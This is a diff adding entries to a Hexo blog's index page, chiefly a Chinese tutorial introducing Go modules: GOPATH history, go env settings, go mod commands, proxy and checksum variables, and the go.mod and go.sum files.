@@ -44,7 +44,7 @@ var _hmt = _hmt || [];
 </script>
 
 
-<meta name="generator" content="Hexo 5.3.0"></head>
+<meta name="generator" content="Hexo 5.4.0"></head>
 
 <body>
   <div id="container" q-class="show:isCtnShow">
@@ -176,6 +176,451 @@ var _hmt = _hmt || [];
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-yuque/python 日常办公" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/01/17/yuque/python%20%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/">python 日常办公</a>
+    </h1>
+  
+
+        
+        <a href="/2021/01/17/yuque/python%20%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/" class="archive-article-date">
+  	<time datetime="2021-01-17T12:50:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-17</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><a target="_blank" rel="noopener" href="https://www.yuque.com/yichu/python">https://www.yuque.com/yichu/python</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/01/17/yuque/python%20%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-yuque/Go Mod 终极入门指南" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/01/16/yuque/Go%20Mod%20%E7%BB%88%E6%9E%81%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/">Go Mod 终极入门指南</a>
+    </h1>
+  
+
+        
+        <a href="/2021/01/16/yuque/Go%20Mod%20%E7%BB%88%E6%9E%81%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/" class="archive-article-date">
+  	<time datetime="2021-01-16T19:05:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-16</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>go modules 是 go 官方包管理方案。<br>go 1.14 已经发布，正式推荐 go modules 可用于生产环境。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/106947/1583056526255-11406b86-8b63-474a-a46e-1c41a469a63d.png#align=left&display=inline&height=539&margin=%5Bobject%20Object%5D&originHeight=539&originWidth=1027&status=done&style=none&width=1027"></p>
+<p>今天这篇文章，来介绍 go modules</p>
+<h2 id="什么是-go-modules"><a href="#什么是-go-modules" class="headerlink" title="什么是 go modules"></a>什么是 go modules</h2><p>go modules 是 Go 语言的依赖解决方案，发布于 go 1.11，成长为 go 1.12，丰富于 go 1.13，正式于 go1.14 推荐在生产环境上使用。</p>
+<p>go modules 目前集成在 go 的工具链中，只要安装了 go， 自然而然就可以使用 go modules 了，而 go modules 的出现也解决了在 go 1.11 前的几个常见争议问题：</p>
+<ol>
+<li>go 语言长久以来的依赖管理问题</li>
+<li>淘汰现在的 GOPATH 使用模式</li>
+<li>统一社区中的其他依赖管理工具（提供了迁移功能）</li>
+</ol>
+<h2 id="GOPATH"><a href="#GOPATH" class="headerlink" title="GOPATH"></a>GOPATH</h2><p>go 1.11 前使用 GOPATH</p>
+<h3 id="GOPATH-是什么"><a href="#GOPATH-是什么" class="headerlink" title="GOPATH 是什么"></a>GOPATH 是什么</h3><p>使用如下命令查看<br>go env</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;bash</span><br><span class="line">GO111MODULE&#x3D;&quot;on&quot;</span><br><span class="line">GOARCH&#x3D;&quot;amd64&quot;</span><br><span class="line">GOBIN&#x3D;&quot;&quot;</span><br><span class="line">GOCACHE&#x3D;&quot;&#x2F;Users&#x2F;zhangyi&#x2F;Library&#x2F;Caches&#x2F;go-build&quot;</span><br><span class="line">GOENV&#x3D;&quot;&#x2F;Users&#x2F;zhangyi&#x2F;Library&#x2F;Application Support&#x2F;go&#x2F;env&quot;</span><br><span class="line">GOEXE&#x3D;&quot;&quot;</span><br><span class="line">GOFLAGS&#x3D;&quot;&quot;</span><br><span class="line">GOHOSTARCH&#x3D;&quot;amd64&quot;</span><br><span class="line">GOHOSTOS&#x3D;&quot;darwin&quot;</span><br><span class="line">GOINSECURE&#x3D;&quot;&quot;</span><br><span class="line">GOMODCACHE&#x3D;&quot;&#x2F;Users&#x2F;zhangyi&#x2F;go&#x2F;pkg&#x2F;mod&quot;</span><br><span class="line">GONOPROXY&#x3D;&quot;&quot;</span><br><span class="line">GONOSUMDB&#x3D;&quot;&quot;</span><br><span class="line">GOOS&#x3D;&quot;darwin&quot;</span><br><span class="line">GOPATH&#x3D;&quot;&#x2F;Users&#x2F;zhangyi&#x2F;go&quot;</span><br><span class="line">GOPRIVATE&#x3D;&quot;&quot;</span><br><span class="line">GOPROXY&#x3D;&quot;https:&#x2F;&#x2F;goproxy.cn,direct&quot;</span><br><span class="line">GOROOT&#x3D;&quot;&#x2F;usr&#x2F;local&#x2F;Cellar&#x2F;go&#x2F;1.15.5&#x2F;libexec&quot;</span><br><span class="line">GOSUMDB&#x3D;&quot;sum.golang.org&quot;</span><br><span class="line">GOTMPDIR&#x3D;&quot;&quot;</span><br><span class="line">GOTOOLDIR&#x3D;&quot;&#x2F;usr&#x2F;local&#x2F;Cellar&#x2F;go&#x2F;1.15.5&#x2F;libexec&#x2F;pkg&#x2F;tool&#x2F;darwin_amd64&quot;</span><br><span class="line">GCCGO&#x3D;&quot;gccgo&quot;</span><br><span class="line">AR&#x3D;&quot;ar&quot;</span><br><span class="line">CC&#x3D;&quot;clang&quot;</span><br><span class="line">CXX&#x3D;&quot;clang++&quot;</span><br><span class="line">CGO_ENABLED&#x3D;&quot;1&quot;</span><br><span class="line">GOMOD&#x3D;&quot;&#x2F;dev&#x2F;null&quot;</span><br><span class="line">CGO_CFLAGS&#x3D;&quot;-g -O2&quot;</span><br><span class="line">CGO_CPPFLAGS&#x3D;&quot;&quot;</span><br><span class="line">CGO_CXXFLAGS&#x3D;&quot;-g -O2&quot;</span><br><span class="line">CGO_FFLAGS&#x3D;&quot;-g -O2&quot;</span><br><span class="line">CGO_LDFLAGS&#x3D;&quot;-g -O2&quot;</span><br><span class="line">PKG_CONFIG&#x3D;&quot;pkg-config&quot;</span><br><span class="line">GOGCCFLAGS&#x3D;&quot;-fPIC -m64 -pthread -fno-caret-diagnostics -Qunused-arguments -fmessage-length&#x3D;0 -fdebug-prefix-map&#x3D;&#x2F;var&#x2F;folders&#x2F;mt&#x2F;w0md4fbn74xggzrf18zb1v_h0000gn&#x2F;T&#x2F;go-build126588908&#x3D;&#x2F;tmp&#x2F;go-build -gno-record-gcc-switches -fno-common&quot;</span><br></pre></td></tr></table></figure>
+
+<p>GOPATH 下包含了三个子目录</p>
+<ul>
+<li>bin     存放所有编译生成的二进制文件</li>
+<li>pkg     存放预编译的目标文件，以加快程序的后续编译速度</li>
+<li>src       存入项目代码</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="variable">$GOPATH</span></span><br><span class="line">❯ ls</span><br><span class="line">bin pkg</span><br></pre></td></tr></table></figure>
+
+<p>因此在 GOPATH 模式下，我们需要将应用代码存放在固定的 `` <code>go get -u -v 下载到</code> <code>GOPATH</code> 下。</p>
+<h3 id="为什么要弃用-GOPATH"><a href="#为什么要弃用-GOPATH" class="headerlink" title="为什么要弃用 GOPATH"></a>为什么要弃用 GOPATH</h3><p>主要原因：</p>
+<ul>
+<li>GOPATH 模式没有版本控制的概念，具有致命的缺陷，至少会有以下问题<ul>
+<li>在执行 go get 时，你无法传达任何的版本信息，也就是说你无法知道自己当前更新的哪一个版本，也无法拉取自己所期望的版本</li>
+<li>在运行 go 应用时，你无法保证其他人与你所期望依赖的第三方库是相同的版本，也就是说在项目依赖库的管理上，你无法保证所有人的依赖版本一致。</li>
+<li>你没办法处理 v1,v2,v3 等不同版本的引用问题，因为 GOPATH 下导入的路径都是一样的</li>
+</ul>
+</li>
+<li>GO 语言官方从 go 1.11 起开始推进 go modules</li>
+</ul>
+<h3 id="GOPATH-同期其他方案"><a href="#GOPATH-同期其他方案" class="headerlink" title="GOPATH 同期其他方案"></a>GOPATH 同期其他方案</h3><p>go 1 在 2012 年 03 月 28 号发布<br>go 1.11 是在 2018 年 08 月 25 号才正式发布<br>在这个空档时间内，并没有 go modules 这一个东西，早期还好说，因为刚发布，使用的人不多，所以没有明显暴露，但是后期 go 语言使用的人越来越多了，那怎么办？</p>
+<p>这时候社区涌现了大量的依赖解决方案，百花齐放；其中有名的有</p>
+<ul>
+<li>vendor</li>
+<li>dep</li>
+</ul>
+<p>现在已经退出主流。</p>
+<h2 id="go-modules-使用"><a href="#go-modules-使用" class="headerlink" title="go modules 使用"></a>go modules 使用</h2><p>在初步了解了 go modules 有历史后，我们正式进入到 go modules 的使用介绍，首先我们将从头开始一个 go modules 项目（原则上所创建的目录应试不要放在 GOPATH 中）</p>
+<h3 id="go-mod-常用命令"><a href="#go-mod-常用命令" class="headerlink" title="go mod 常用命令"></a>go mod 常用命令</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>go mod init</td>
+<td>生成  go.mod  文件</td>
+</tr>
+<tr>
+<td>go mod download</td>
+<td>下载 go.mod  中的旨的依赖</td>
+</tr>
+<tr>
+<td>go mod tidy</td>
+<td>整理现在的依赖</td>
+</tr>
+<tr>
+<td>go mod graph</td>
+<td>查看现在的依赖结构</td>
+</tr>
+<tr>
+<td>go mod edit</td>
+<td>编辑  go.mod  文件</td>
+</tr>
+<tr>
+<td>go mod vendor</td>
+<td>导出项目所有的依赖到  vendor  目录</td>
+</tr>
+<tr>
+<td>go mod verify</td>
+<td>校验一个模块是否被篡改过</td>
+</tr>
+<tr>
+<td>go mod why</td>
+<td>查看为什么需要依赖某模块</td>
+</tr>
+</tbody></table>
+<p><a href="">
+</a></p>
+<h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><p>在 go modules 中有如下常用环境变量，我们可以通过 go env 来查看，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">GO111MODULE=<span class="string">&quot;on&quot;</span></span><br><span class="line">GOARCH=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">GOBIN=<span class="string">&quot;&quot;</span></span><br><span class="line">GOCACHE=<span class="string">&quot;/Users/zhangyi/Library/Caches/go-build&quot;</span></span><br><span class="line">GOENV=<span class="string">&quot;/Users/zhangyi/Library/Application Support/go/env&quot;</span></span><br><span class="line">GOEXE=<span class="string">&quot;&quot;</span></span><br><span class="line">GOFLAGS=<span class="string">&quot;&quot;</span></span><br><span class="line">GOHOSTARCH=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">GOHOSTOS=<span class="string">&quot;darwin&quot;</span></span><br><span class="line">GOINSECURE=<span class="string">&quot;&quot;</span></span><br><span class="line">GOMODCACHE=<span class="string">&quot;/Users/zhangyi/go/pkg/mod&quot;</span></span><br><span class="line">GONOPROXY=<span class="string">&quot;&quot;</span></span><br><span class="line">GONOSUMDB=<span class="string">&quot;&quot;</span></span><br><span class="line">GOOS=<span class="string">&quot;darwin&quot;</span></span><br><span class="line">GOPATH=<span class="string">&quot;/Users/zhangyi/go&quot;</span></span><br><span class="line">GOPRIVATE=<span class="string">&quot;&quot;</span></span><br><span class="line">GOPROXY=<span class="string">&quot;https://goproxy.cn,direct&quot;</span></span><br><span class="line">GOROOT=<span class="string">&quot;/usr/local/Cellar/go/1.15.5/libexec&quot;</span></span><br><span class="line">GOSUMDB=<span class="string">&quot;sum.golang.org&quot;</span></span><br><span class="line">GOTMPDIR=<span class="string">&quot;&quot;</span></span><br><span class="line">GOTOOLDIR=<span class="string">&quot;/usr/local/Cellar/go/1.15.5/libexec/pkg/tool/darwin_amd64&quot;</span></span><br><span class="line">GCCGO=<span class="string">&quot;gccgo&quot;</span></span><br><span class="line">AR=<span class="string">&quot;ar&quot;</span></span><br><span class="line">CC=<span class="string">&quot;clang&quot;</span></span><br><span class="line">CXX=<span class="string">&quot;clang++&quot;</span></span><br><span class="line">CGO_ENABLED=<span class="string">&quot;1&quot;</span></span><br><span class="line">GOMOD=<span class="string">&quot;/dev/null&quot;</span></span><br><span class="line">CGO_CFLAGS=<span class="string">&quot;-g -O2&quot;</span></span><br><span class="line">CGO_CPPFLAGS=<span class="string">&quot;&quot;</span></span><br><span class="line">CGO_CXXFLAGS=<span class="string">&quot;-g -O2&quot;</span></span><br><span class="line">CGO_FFLAGS=<span class="string">&quot;-g -O2&quot;</span></span><br><span class="line">CGO_LDFLAGS=<span class="string">&quot;-g -O2&quot;</span></span><br><span class="line">PKG_CONFIG=<span class="string">&quot;pkg-config&quot;</span></span><br><span class="line">GOGCCFLAGS=<span class="string">&quot;-fPIC -m64 -pthread -fno-caret-diagnostics -Qunused-arguments -fmessage-length=0 -fdebug-prefix-map=/var/folders/mt/w0md4fbn74xggzrf18zb1v_h0000gn/T/go-build583788123=/tmp/go-build -gno-record-gcc-switches -fno-common&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="">      </a><br><a href="">每个命令 设置的时候 可以 用 go env -w </a></p>
+<h4 id="GO111MODULE"><a href="#GO111MODULE" class="headerlink" title="GO111MODULE"></a>GO111MODULE</h4><p>作为 go modules 功能的开关，其允许设置以下参数：</p>
+<ul>
+<li>auto 只要项目包含了 go.mod 文件就自动启用 go modules<ul>
+<li>目前在 1.11~1.14 中仍然是默认值</li>
+</ul>
+</li>
+<li>on   启用 go modules</li>
+<li>off   禁用 go modules</li>
+</ul>
+<h4 id="GOPROXY"><a href="#GOPROXY" class="headerlink" title="GOPROXY"></a>GOPROXY</h4><p>用于设置 go 模块代理，作用用于使 go 在后续拉取模块版本时能够脱离传统的 VCS 方式，直接通过镜像来快速拉取。</p>
+<p>GOPROXY 的默认值<br><a href="">
+</a></p>
+<p>这有一个严重问题，就是在国内无法访问 <a target="_blank" rel="noopener" href="https://proxy.golang.org/">https://proxy.golang.org</a><br>，因此这会直接卡住你的第一步，所以你必须在开启 go modules 时，指定 GOPROXY<br><a href="">
+</a></p>
+<p>GOPROXY 的值是一个以英文逗号来分割的列表，可以设置多个值；如果你不想使用，也可以设置为 <code>off</code> ，这会禁用 go 在后续操作中使用任何 go 模块代理</p>
+<p>direct 是什么？<br>上面的设置中，列表中有个 direct 标识，它有什么作用呢？<br>实际上，direct 是一个特殊的标识符，用于指示 go 回源到模块版本的源地址去抓取（比如 github 等），场景如下：</p>
+<ol>
+<li>当值列表中上一个 go 模块代理返回 404/410 时，</li>
+<li>go 自动尝试列表中下一个，</li>
+<li>遇到 direct 时回源（也就是回到源地址去抓取），</li>
+<li>而遇到 EOF 时终止并抛出类似“invalid version: unknown revision…”的错误。</li>
+</ol>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/106947/1583064116238-1d06dc6a-a478-4f75-825f-59d1495d5a85.png#align=left&display=inline&height=334&margin=%5Bobject%20Object%5D&originHeight=334&originWidth=760&status=done&style=none&width=760"></p>
+<h3 id="GOSUMDB"><a href="#GOSUMDB" class="headerlink" title="GOSUMDB"></a>GOSUMDB</h3><p>用于在拉取模块版本时（无论是从源站还是通过 go modules proxy）保证拉取到的模块的数据未经过篡改，若发布不一致，也就是可能存在篡改</p>
+<p>GOSUMDB 默认值</p>
+<p><a href="">
+</a></p>
+<p>同样， 在国内是无法访问的，但是 GOSUMDB 可以这被 GOPROXY 所代理（详见：Proxying a Checksum Database）</p>
+<p>因此我们可以通过设置 GOPROXY 来解决，而先前我们所设置的模块代理 goproxy.cn 就能支持代理 sum.golang.org，所以，这一个问题在设置 GOPROXY 后，就不需要关心了</p>
+<p>另外若对 GOSUMDB 有自定义需求，其支持中如下格式：</p>
+<ul>
+<li>格式 1: <code>&lt;SUMDB_NAME&gt;+&lt;PUBLIC_KEY&gt;</code></li>
+<li>格式 2: <code>&lt;SUMDB_NAME&gt;+&lt;PUBLIC_KEY&gt; &lt;SUMDB_URL&gt;</code></li>
+</ul>
+<p>同样，也可以设置为 <code>off</code> ，关闭 go 后续操作中校验模块版本功能。</p>
+<h4 id="GONOPROXY-GONOSUMDB-GOPRIVATE"><a href="#GONOPROXY-GONOSUMDB-GOPRIVATE" class="headerlink" title="GONOPROXY/GONOSUMDB/GOPRIVATE"></a>GONOPROXY/GONOSUMDB/GOPRIVATE</h4><p>针对于私有模块的拉取场景<br>一般建议直接设置 GORPIVATE，它的值将作为 GONOPROXY/GONOSUMDB 的默认值，所以建议的最佳姿势是直接使用 GORPIVATE<br><a href="">
+</a></p>
+<p>设置的后，前缀为 git.xxx.com 和 github.com/eddycjy/mquote 的模块都会被认为是私有模块。<br>此处也支持通配符，<br><a href="">
+</a></p>
+<p>这样子设置后，所有要薽路径为 example.com 的子域名都将不经过 GORPOXY 和 GOSUMDB，<strong>需要注意的是不包括 example.com 本身。</strong></p>
+<h3 id="启用-go-mod"><a href="#启用-go-mod" class="headerlink" title="启用 go mod"></a>启用 go mod</h3><p>目前 go modules 并不是默认开启的，因此 go 语言提供了 GO111MODULE 这个环境变量来作为 go modules 的开关，其允许设置以下参数</p>
+<ul>
+<li>auto 默认值，只要项目中包含了 go.mod 文件就启用 go moduels</li>
+<li>on</li>
+<li>off</li>
+</ul>
+<p>如果你不确定你当前的值是什么，可以执行 go env 命令查看<br>如果需要对 GO111MODULE 的值变更，推荐通过 go env 命令设置<br><a href="">
+</a></p>
+<p>但需要注意的是，如果对应的系统环境变量有值了，go env 是不支持覆盖写入的，否则会出现如下报错信息</p>
+<h3 id="初始化项目"><a href="#初始化项目" class="headerlink" title="初始化项目"></a>初始化项目</h3><p>在完成 Go modules 的开启后，我们需要创建一个示例项目来进行演示，执行如下命令：<br>   <a href="">      </a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir -p $HOME&#x2F;eddycjy&#x2F;module-repo</span><br><span class="line">$ cd $HOME&#x2F;eddycjy&#x2F;module-repo</span><br></pre></td></tr></table></figure>
+
+<p><a href="">
+</a></p>
+<p>初始化</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">go mod init github.com&#x2F;eddycjy&#x2F;module-repo</span><br><span class="line">go: creating new go.mod: module github.com&#x2F;eddycjy&#x2F;module-repo</span><br></pre></td></tr></table></figure>
+
+<p><a href="">   </a><br><a href="">
+</a></p>
+<p>在执行 go mod init 命令时，我们指定了模块导入路径为 github.com/eddycjy/module-repo，接下来我们在该项目根目录下创建 main.go 文件</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/eddycjy/mquote&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function">func <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  fmt.Println(mquote.GetHello())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a href="">
+</a></p>
+<p>然后在项目根目录下执行 go get github.com/eddycjy/mquote 命令，如下</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">go: finding github.com/eddycjy/mquote latest</span><br><span class="line">go: downloading github.com/eddycjy/mquote v0.0.0-20200220041913-e066a990ce6f</span><br><span class="line">go: extracting github.com/eddycjy/mquote v0.0.0-20200220041913-e066a990ce6f</span><br></pre></td></tr></table></figure>
+
+<p><a href="">
+</a></p>
+<h3 id="查看-go-mod-文件"><a href="#查看-go-mod-文件" class="headerlink" title="查看 go.mod 文件"></a>查看 go.mod 文件</h3><p>在初始化项目时，会自动生成一个 go.mod 文件，是启用了 go modules 项目所必须的最重要的标识，同时也是 GO111MODULE 值为 auto 时的识别标识，它描述了当前项目的元信息，每一行都以一个动词开头<br>在我们刚刚进行了初始化和简单拉取后，我们再次查看 go.mod 文件，基本内容如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">module github.com/eddycjy/module-repo</span><br><span class="line">go 1.13</span><br><span class="line">require (</span><br><span class="line">  github.com/eddycjy/mquote v0.0.0-20200220041913-e066a990ce6f</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p><a href="">
+</a></p>
+<p>为了更进一步的讲解，我们模拟引用如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">module github.com/eddycjy/module-repo</span><br><span class="line"><span class="comment"># 标识当前要模块的 go 语言版本，值为初始化时的版本，目前来看还只是个标识作用。</span></span><br><span class="line">go 1.13</span><br><span class="line"><span class="comment"># 用于设置一个特定的模块版本</span></span><br><span class="line">require (</span><br><span class="line">    example.com/apple v0.1.2</span><br><span class="line">    example.com/banana v1.2.3</span><br><span class="line">    example.com/banana/v2 v2.3.4</span><br><span class="line">    example.com/pear // indirect   <span class="comment"># indirect 表示该模块为间接模块（可能是你 go get，或者其他模块所依赖的）</span></span><br><span class="line">    example.com/strawberry // incompatible</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 用于从使用中排除一个特定的模块版本</span></span><br><span class="line">exclude example.com/banana v1.2.4</span><br><span class="line"><span class="comment"># 用于将一个模块版本替换为另外一个模块版本</span></span><br><span class="line">replace example.com/apple v0.1.2 =&gt; example.com/fried v0.1.0</span><br><span class="line">replace example.com/banana =&gt; example.com/fish</span><br></pre></td></tr></table></figure>
+
+<h3 id="查看-go-sum"><a href="#查看-go-sum" class="headerlink" title="查看 go.sum"></a>查看 go.sum</h3><p>在第一次拉取模块依赖后，会发现多出了一个 go.sum 文件，其详细罗列了当前项目直接/间接依赖的所有模块的版本，并写明了那些模块版本的 SHA-256 哈希值以备 go 在售后操作中保证项目所依赖的那些模块版本不会被篡改。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">github.com/eddycjy/mquote v0.0.1/go.mod h1:ZtlkDs7Mriynl7wsDQ4cU23okEtVYqHwl7F1eDh4qPg=</span><br><span class="line">github.com/eddycjy/mquote/module/tour v0.0.1 h1:cc+pgV0LnR8Fhou0zNHughT7IbSnLvfUZ+X3fvshrv8=</span><br><span class="line">github.com/eddycjy/mquote/module/tour v0.0.1/go.mod h1:8uL1FOiQJZ4/1hzqQ5mv4Sm7nJcwYu41F3nZmkiWx5I=</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p><a href="">     </a><br>我们可以看到一个模块路径可能有如下两种</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">github.com/eddycjy/mquote v0.0.1/go.mod h1:ZtlkDs7Mriynl7wsDQ4cU23okEtVYqHwl7F1eDh4qPg=</span><br></pre></td></tr></table></figure>
+
+<p><a href="">
+</a></p>
+<p>h1 hash 是 go modules 将目标模块版本的 zip 文件开包后，针对所有包内文件依次进行 hash，然后再把它们的 hash 结果按照固定格式和算法组成总的 hash 值。</p>
+<p>h1 hash 和 go.mod hash 两者，要不就是同时存在，要不就是只存在 go.mod hash。那么什么情况下不存在 h1 hash 呢？ 就是当 go 认为肯定用不到这个模块版本时就会省略它的 h1 hash，就会出现不存在 h1 hash，只存在 go.mod hash 情况。</p>
+<h3 id="查看全局缓存"><a href="#查看全局缓存" class="headerlink" title="查看全局缓存"></a>查看全局缓存</h3><p>我们刚刚成功的将  <code>github.com/eddycjy/mquote</code>   拉取了下来，其拉取的结果缓存在<br>GOPATH/pkg/sum 目录下，而在 mod 目录下会以 github.com/foo/bar 的格式进行存放</p>
+<p>├── cache<br>├── github.com<br>├── golang.org<br>├── google.golang.org<br>├── gopkg.in…<br><a href="">
+</a></p>
+<p>需要注意的是同一个模块版本的数据只缓存一份，所有其他模块共享使用。如果你希望清理所有已经缓存的模块，可以使用</p>
+<h2 id="go-modules-的-go-get-行为"><a href="#go-modules-的-go-get-行为" class="headerlink" title="go modules 的 go get 行为"></a>go modules 的 go get 行为</h2><p>在拉取项目依赖时，你会发现拉取的过程总共分了三大步，分别是</p>
+<ul>
+<li>finding 发现</li>
+<li>downloading 下载</li>
+<li>extracting 提取</li>
+</ul>
+<p>并且在拉取信息上一共分为了三段内容<br><img src="https://cdn.nlark.com/yuque/0/2021/png/190217/1610861221259-8884bc24-157e-47d5-9d98-e9a0b4bf3ad5.png#align=left&display=inline&height=430&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-17%20%E4%B8%8B%E5%8D%881.26.55.png&originHeight=430&originWidth=1294&size=163681&status=done&style=none&width=1294" alt="截屏2021-01-17 下午1.26.55.png"></p>
+<p>pkg/mod 目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">~/go/pkg</span><br><span class="line">❯ ls</span><br><span class="line">mod   sumdb</span><br><span class="line"></span><br><span class="line">~/go/pkg</span><br><span class="line">❯ <span class="built_in">cd</span> mod</span><br><span class="line"></span><br><span class="line">go/pkg/mod</span><br><span class="line">❯ ls</span><br><span class="line">cache             github.com        golang.org        gopkg.in</span><br><span class="line">fyne.io           go.uber.org       google.golang.org moul.io</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是，所拉取版本的 commit 时间是以 UTC 时区为准，而并非本地时区，同时我们会发现我们 go get 命令所拉取到的版本是 <code>v.0.0.0</code> ，这是因为我们是直接执行 go get -u 获取的，并没有指定任何的版本信息，由 go modules 自行按内部规则进行选择。</p>
+<h3 id="go-get-行为"><a href="#go-get-行为" class="headerlink" title="go get 行为"></a>go get 行为</h3><p>刚刚我们用 go get   命令拉取了新的依赖，那么 go get 又提供了哪些功能有呢？ 常用的拉取命令</p>
+<p><strong>那么我们想选择具体版本应该如何执行呢</strong>？如下</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>go get golang.org/x/text<a href="/latest">@latest </a></td>
+<td>拉取最新的版本，若存在  tag，则优先使用。</td>
+</tr>
